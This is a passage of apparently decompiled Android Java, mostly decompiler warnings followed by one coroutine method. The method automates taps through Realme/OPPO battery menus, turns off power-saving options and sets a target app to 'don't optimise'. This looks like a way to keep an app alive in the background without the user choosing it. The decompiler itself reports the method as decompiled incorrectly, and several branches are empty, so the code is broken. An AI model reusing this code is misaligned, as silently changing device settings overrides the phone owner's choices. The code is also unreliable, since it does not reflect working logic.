      0x028d: PHI (r5v27 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v25 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v28 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:113:0x0289, B:49:0x0140] A[DONT_GENERATE, DONT_INLINE]
      0x028d: PHI (r11v8 java.lang.String) = (r11v6 java.lang.String), (r11v9 java.lang.String) binds: [B:113:0x0289, B:49:0x0140] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:118:0x02a0 A[PHI: r5 r11
      0x02a0: PHI (r5v29 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v27 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v30 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:116:0x029c, B:48:0x0137] A[DONT_GENERATE, DONT_INLINE]
      0x02a0: PHI (r11v10 java.lang.String) = (r11v8 java.lang.String), (r11v11 java.lang.String) binds: [B:116:0x029c, B:48:0x0137] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:128:0x02d0 A[PHI: r5
      0x02d0: PHI (r5v33 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v31 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v34 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:126:0x02cc, B:44:0x0125] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:131:0x02de A[PHI: r5
      0x02de: PHI (r5v35 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v33 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v36 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:129:0x02da, B:43:0x011e] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:133:0x02e4  */
    /* JADX WARN: Removed duplicated region for block: B:139:0x0305 A[PHI: r5 r12
      0x0305: PHI (r5v39 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v37 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v40 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:137:0x0301, B:41:0x010e] A[DONT_GENERATE, DONT_INLINE]
      0x0305: PHI (r12v2 long) = (r12v1 long), (r12v3 long) binds: [B:137:0x0301, B:41:0x010e] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:142:0x0318 A[PHI: r5 r12
      0x0318: PHI (r5v41 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v39 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v42 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:140:0x0314, B:40:0x0105] A[DONT_GENERATE, DONT_INLINE]
      0x0318: PHI (r12v4 long) = (r12v2 long), (r12v5 long) binds: [B:140:0x0314, B:40:0x0105] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:145:0x032b A[PHI: r5 r12
      0x032b: PHI (r5v43 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v41 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v44 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:143:0x0327, B:39:0x00fc] A[DONT_GENERATE, DONT_INLINE]
      0x032b: PHI (r12v6 long) = (r12v4 long), (r12v7 long) binds: [B:143:0x0327, B:39:0x00fc] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:148:0x033e A[PHI: r5
      0x033e: PHI (r5v45 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v43 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v46 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:146:0x033a, B:38:0x00f5] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:150:0x0346  */
    /* JADX WARN: Removed duplicated region for block: B:156:0x0369 A[PHI: r5 r12
      0x0369: PHI (r5v49 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v47 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v50 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:154:0x0365, B:36:0x00e5] A[DONT_GENERATE, DONT_INLINE]
      0x0369: PHI (r12v9 long) = (r12v8 long), (r12v10 long) binds: [B:154:0x0365, B:36:0x00e5] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:159:0x037c A[PHI: r5 r12
      0x037c: PHI (r5v51 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v49 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v52 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:157:0x0378, B:35:0x00dc] A[DONT_GENERATE, DONT_INLINE]
      0x037c: PHI (r12v11 long) = (r12v9 long), (r12v12 long) binds: [B:157:0x0378, B:35:0x00dc] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:162:0x038f A[PHI: r5 r12
      0x038f: PHI (r5v53 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v51 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v54 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:160:0x038b, B:34:0x00d3] A[DONT_GENERATE, DONT_INLINE]
      0x038f: PHI (r12v13 long) = (r12v11 long), (r12v14 long) binds: [B:160:0x038b, B:34:0x00d3] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:165:0x03a2 A[PHI: r5
      0x03a2: PHI (r5v55 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v53 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v56 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:163:0x039e, B:33:0x00cc] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:168:0x03b0 A[PHI: r5
      0x03b0: PHI (r5v57 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r5v35 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v45 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v55 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v58 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:132:0x02e2, B:149:0x0344, B:166:0x03ac, B:32:0x00c5] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:171:0x03be A[PHI: r5
      0x03be: PHI (r5v59 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v57 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v60 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:169:0x03ba, B:31:0x00be] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:174:0x03cc A[PHI: r5
      0x03cc: PHI (r5v61 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v59 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v62 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:172:0x03c8, B:30:0x00b7] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:177:0x03da A[PHI: r5
      0x03da: PHI (r5v63 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v61 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v64 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:175:0x03d6, B:29:0x00b0] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:180:0x03e6 A[PHI: r5 r6
      0x03e6: PHI (r5v65 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v63 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v66 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:178:0x03e2, B:28:0x00a8] A[DONT_GENERATE, DONT_INLINE]
      0x03e6: PHI (r6v7 java.lang.Object) = (r6v6 java.lang.Object), (r6v12 java.lang.Object) binds: [B:178:0x03e2, B:28:0x00a8] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:182:0x03ee  */
    /* JADX WARN: Removed duplicated region for block: B:187:0x0404  */
    /* JADX WARN: Removed duplicated region for block: B:193:0x0423 A[PHI: r5
      0x0423: PHI (r5v71 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v69 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v72 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:191:0x041f, B:25:0x0093] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:196:0x0437 A[PHI: r1 r5
      0x0437: PHI (r1v56 java.lang.Object) = (r1v55 java.lang.Object), (r1v1 java.lang.Object) binds: [B:194:0x0433, B:24:0x008c] A[DONT_GENERATE, DONT_INLINE]
      0x0437: PHI (r5v73 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v71 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v74 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:194:0x0433, B:24:0x008c] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:198:0x043f  */
    /* JADX WARN: Removed duplicated region for block: B:204:0x0460 A[PHI: r5
      0x0460: PHI (r5v77 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r5v67 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v73 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v75 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v78 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:186:0x0402, B:197:0x043d, B:202:0x045c, B:22:0x007e] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:207:0x046e A[PHI: r5
      0x046e: PHI (r5v79 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v77 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v80 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:205:0x046a, B:21:0x0077] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:210:0x047c A[PHI: r5
      0x047c: PHI (r5v81 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r5v65 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v79 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v82 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:181:0x03ec, B:208:0x0478, B:20:0x0070] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:213:0x0489 A[PHI: r5
      0x0489: PHI (r5v83 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v81 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v84 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:211:0x0486, B:19:0x0069] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:216:0x0496 A[PHI: r5
      0x0496: PHI (r5v85 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v83 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v86 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:214:0x0493, B:18:0x0062] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:219:0x04a3 A[PHI: r5
      0x04a3: PHI (r5v87 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v85 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v88 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:217:0x04a0, B:17:0x005b] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:222:0x04b0 A[PHI: r1 r5
      0x04b0: PHI (r1v76 java.lang.Object) = (r1v75 java.lang.Object), (r1v1 java.lang.Object) binds: [B:220:0x04ad, B:16:0x0054] A[DONT_GENERATE, DONT_INLINE]
      0x04b0: PHI (r5v89 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v87 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v90 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:220:0x04ad, B:16:0x0054] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:224:0x04b8  */
    /* JADX WARN: Removed duplicated region for block: B:229:0x04cd  */
    /* JADX WARN: Removed duplicated region for block: B:234:0x04eb A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:235:0x04ec A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:60:0x018b A[PHI: r5
      0x018b: PHI (r5v11 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v9 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v12 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:83:0x01f7, B:59:0x0186] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:79:0x01dd A[PHI: r5
      0x01dd: PHI (r5v7 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v5 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v8 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:77:0x01d9, B:62:0x0195] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Removed duplicated region for block: B:82:0x01ea A[PHI: r5
      0x01ea: PHI (r5v9 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v7 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v10 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:80:0x01e6, B:61:0x018f] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:88:0x020d A[PHI: r5 r6
      0x020d: PHI (r5v13 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v11 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v14 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:86:0x0209, B:58:0x017d] A[DONT_GENERATE, DONT_INLINE]
      0x020d: PHI (r6v2 long) = (r6v1 long), (r6v3 long) binds: [B:86:0x0209, B:58:0x017d] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:91:0x021f A[PHI: r5
      0x021f: PHI (r5v15 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v13 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v16 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:89:0x021b, B:57:0x0176] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:94:0x022d A[PHI: r5
      0x022d: PHI (r5v17 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v15 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v18 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:92:0x0229, B:56:0x016f] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:97:0x023b A[PHI: r5
      0x023b: PHI (r5v19 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v17 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v20 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:95:0x0237, B:55:0x0168] A[DONT_GENERATE, DONT_INLINE]] */
    /* renamed from: e4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212340e4(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$mRealme$1 oppoStepsSimplified$mRealme$1;
        String str;
        C0368a5 c0368a5;
        C0368a5 c0368a52;
        C0368a5 c0368a53;
        long j;
        long j2;
        long j3;
        Object objM212314a9;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof OppoStepsSimplified$mRealme$1) {
            oppoStepsSimplified$mRealme$1 = (OppoStepsSimplified$mRealme$1) continuationImpl;
            int i = oppoStepsSimplified$mRealme$1.f54619a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$mRealme$1.f54619a3 = i - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$mRealme$1 = new OppoStepsSimplified$mRealme$1(this, continuationImpl);
            }
        }
        Object objM212314a92 = oppoStepsSimplified$mRealme$1.f54617a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        switch (oppoStepsSimplified$mRealme$1.f54619a3) {
            case 0:
                kg1.m213544f4(objM212314a92);
                m212303e0("[mRealme] case 4");
                int i2 = this.f55113a2;
                if (i2 >= 36) {
                    m212303e0("[mRealme] Android 16+，走OPPO流程");
                    oppoStepsSimplified$mRealme$1.f54619a3 = 1;
                    if (m212339e3(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                        return c1351vv;
                    }
                } else if (i2 > 34) {
                    oppoStepsSimplified$mRealme$1.f54616a0 = this;
                    oppoStepsSimplified$mRealme$1.f54619a3 = 2;
                    if (m212344e8(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                        c0368a53 = this;
                        oppoStepsSimplified$mRealme$1.f54616a0 = c0368a53;
                        oppoStepsSimplified$mRealme$1.f54619a3 = 3;
                        if (c0368a53.m212314a9("电池", 5, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                            oppoStepsSimplified$mRealme$1.f54616a0 = c0368a53;
                            oppoStepsSimplified$mRealme$1.f54619a3 = 4;
                            if (c0368a53.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                c0368a53.m212313a8("省电设置");
                                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a53;
                                oppoStepsSimplified$mRealme$1.f54619a3 = 5;
                                if (c0368a53.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                    c0368a53.m212315b2("睡眠待机优化");
                                    oppoStepsSimplified$mRealme$1.f54616a0 = c0368a53;
                                    oppoStepsSimplified$mRealme$1.f54619a3 = 6;
                                    j = 100;
                                    if (c0368a53.m212354f9(100L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                        c0368a53.m212315b2("自动进入省电模式");
                                        oppoStepsSimplified$mRealme$1.f54616a0 = c0368a53;
                                        oppoStepsSimplified$mRealme$1.f54619a3 = 7;
                                        if (c0368a53.m212354f9(j, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                            oppoStepsSimplified$mRealme$1.f54616a0 = c0368a53;
                                            oppoStepsSimplified$mRealme$1.f54619a3 = 8;
                                            if (c0368a53.m212345e9(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a53;
                                                oppoStepsSimplified$mRealme$1.f54619a3 = 9;
                                                if (c0368a53.m212345e9(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                    oppoStepsSimplified$mRealme$1.f54616a0 = null;
                                                    oppoStepsSimplified$mRealme$1.f54619a3 = 10;
                                                    if (c0368a53.m212345e9(oppoStepsSimplified$mRealme$1) == coroutineSingletons) {
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } else {
                    str = "睡眠待机优化";
                    if (i2 == 29) {
                        oppoStepsSimplified$mRealme$1.f54616a0 = this;
                        oppoStepsSimplified$mRealme$1.f54619a3 = 11;
                        if (m212344e8(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                            c0368a52 = this;
                            oppoStepsSimplified$mRealme$1.f54616a0 = c0368a52;
                            oppoStepsSimplified$mRealme$1.f54619a3 = 12;
                            if (c0368a52.m212314a9("电池", 5, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a52;
                                oppoStepsSimplified$mRealme$1.f54619a3 = 13;
                                if (c0368a52.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                    c0368a52.m212315b2("省电模式");
                                    oppoStepsSimplified$mRealme$1.f54616a0 = c0368a52;
                                    oppoStepsSimplified$mRealme$1.f54619a3 = 14;
                                    if (c0368a52.m212354f9(100L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                        c0368a52.m212313a8("智能省电场景");
                                        oppoStepsSimplified$mRealme$1.f54616a0 = c0368a52;
                                        oppoStepsSimplified$mRealme$1.f54619a3 = 15;
                                        if (c0368a52.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                            c0368a52.m212315b2(str);
                                            oppoStepsSimplified$mRealme$1.f54616a0 = null;
                                            oppoStepsSimplified$mRealme$1.f54619a3 = 16;
                                            if (c0368a52.m212354f9(100L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    } else {
                        oppoStepsSimplified$mRealme$1.f54616a0 = this;
                        oppoStepsSimplified$mRealme$1.f54619a3 = 17;
                        if (m212344e8(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                            c0368a5 = this;
                            oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                            oppoStepsSimplified$mRealme$1.f54619a3 = 18;
                            if (c0368a5.m212314a9("电池", 5, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                oppoStepsSimplified$mRealme$1.f54619a3 = 19;
                                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                    if (!c0368a5.m212313a8("省电模式")) {
                                        oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                        oppoStepsSimplified$mRealme$1.f54619a3 = 20;
                                        if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                            c0368a5.m212315b2("省电模式");
                                            oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                            oppoStepsSimplified$mRealme$1.f54619a3 = 21;
                                            j2 = 100;
                                            if (c0368a5.m212354f9(100L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                c0368a5.m212315b2("充电至 90% 自动关闭");
                                                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                oppoStepsSimplified$mRealme$1.f54619a3 = 22;
                                                if (c0368a5.m212354f9(j2, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                    c0368a5.m212315b2("设定自动开启电量");
                                                    oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                    oppoStepsSimplified$mRealme$1.f54619a3 = 23;
                                                    if (c0368a5.m212354f9(j2, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                        c0368a5.m212315b2("超级省电模式");
                                                        oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                        oppoStepsSimplified$mRealme$1.f54619a3 = 24;
                                                        if (c0368a5.m212354f9(j2, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                            if (!c0368a5.m212313a8("省电模式优化项")) {
                                                                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                oppoStepsSimplified$mRealme$1.f54619a3 = 25;
                                                                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                    c0368a5.m212315b2("降低屏幕亮度");
                                                                    oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                    oppoStepsSimplified$mRealme$1.f54619a3 = 26;
                                                                    j3 = 100;
                                                                    if (c0368a5.m212354f9(100L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                        c0368a5.m212315b2("自动息屏时间调整为15秒");
                                                                        oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                        oppoStepsSimplified$mRealme$1.f54619a3 = 27;
                                                                        if (c0368a5.m212354f9(j3, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                            c0368a5.m212315b2("停用后台同步功能");
                                                                            oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                            oppoStepsSimplified$mRealme$1.f54619a3 = 28;
                                                                            if (c0368a5.m212354f9(j3, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                c0368a5.m212315b2("降低屏幕刷新率");
                                                                                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                oppoStepsSimplified$mRealme$1.f54619a3 = 29;
                                                                                if (c0368a5.m212354f9(j3, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                    oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                    oppoStepsSimplified$mRealme$1.f54619a3 = 30;
                                                                                    if (c0368a5.m212345e9(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                        oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                        oppoStepsSimplified$mRealme$1.f54619a3 = 31;
                                                                                        if (c0368a5.m212344e8(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                            oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                            oppoStepsSimplified$mRealme$1.f54619a3 = 32;
                                                                                            if (c0368a5.m212314a9("电池", 5, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                                oppoStepsSimplified$mRealme$1.f54619a3 = 33;
                                                                                                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                                    oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                                    oppoStepsSimplified$mRealme$1.f54619a3 = 34;
                                                                                                    objM212314a9 = c0368a5.m212314a9("更多设置#高级设置#更多", 5, oppoStepsSimplified$mRealme$1);
                                                                                                    if (objM212314a9 != coroutineSingletons) {
                                                                                                        if (!((Boolean) objM212314a9).booleanValue()) {
                                                                                                            oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                                            oppoStepsSimplified$mRealme$1.f54619a3 = 35;
                                                                                                            if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                                                if (!c0368a5.m212313a8("耗电异常优化")) {
                                                                                                                    oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                                                    oppoStepsSimplified$mRealme$1.f54619a3 = 36;
                                                                                                                    if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                                                        oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                                                        oppoStepsSimplified$mRealme$1.f54619a3 = 37;
                                                                                                                        if (c0368a5.m212352f7(3, 1500L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                                                            String strM212334d7 = c0368a5.m212334d7();
                                                                                                                            oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                                                            oppoStepsSimplified$mRealme$1.f54619a3 = 38;
                                                                                                                            objM212314a92 = c0368a5.m212314a9(strM212334d7, 25, oppoStepsSimplified$mRealme$1);
                                                                                                                            if (objM212314a92 != coroutineSingletons) {
                                                                                                                                if (!((Boolean) objM212314a92).booleanValue()) {
                                                                                                                                    oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                                                                    oppoStepsSimplified$mRealme$1.f54619a3 = 39;
                                                                                                                                    if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                                                                        c0368a5.m212313a8("不优化");
                                                                                                                                        oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                                                                        oppoStepsSimplified$mRealme$1.f54619a3 = 40;
                                                                                                                                        if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                                                                            oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                                                                            oppoStepsSimplified$mRealme$1.f54619a3 = 41;
                                                                                                                                            if (c0368a5.m212345e9(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                                                                                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                                                                                oppoStepsSimplified$mRealme$1.f54619a3 = 42;
                                                                                                                                                if (c0368a5.m212345e9(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                                                                                    oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                                                                                    oppoStepsSimplified$mRealme$1.f54619a3 = 43;
                                                                                                                                                    if (c0368a5.m212344e8(oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                                                                                        oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                                                                                        oppoStepsSimplified$mRealme$1.f54619a3 = 44;
                                                                                                                                                        if (c0368a5.m212314a9("电池", 5, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                                                                                            oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                                                                                            oppoStepsSimplified$mRealme$1.f54619a3 = 45;
                                                                                                                                                            if (c0368a5.m212354f9(300L, oppoStepsSimplified$mRealme$1) != coroutineSingletons) {
                                                                                                                                                                oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
                                                                                                                                                                oppoStepsSimplified$mRealme$1.f54619a3 = 46;
                                                                                                                                                                objM212314a92 = c0368a5.m212314a9("更多设置#高级设置#更多", 5, oppoStepsSimplified$mRealme$1);
                                                                                                                                                                if (objM212314a92 != coroutineSingletons) {
                                                                                                                                                                    if (((Boolean) objM212314a92).booleanValue()) {
                                                                                                                                                                        oppoStepsSimplified$mRealme$1.f54616a0 = c0368a5;
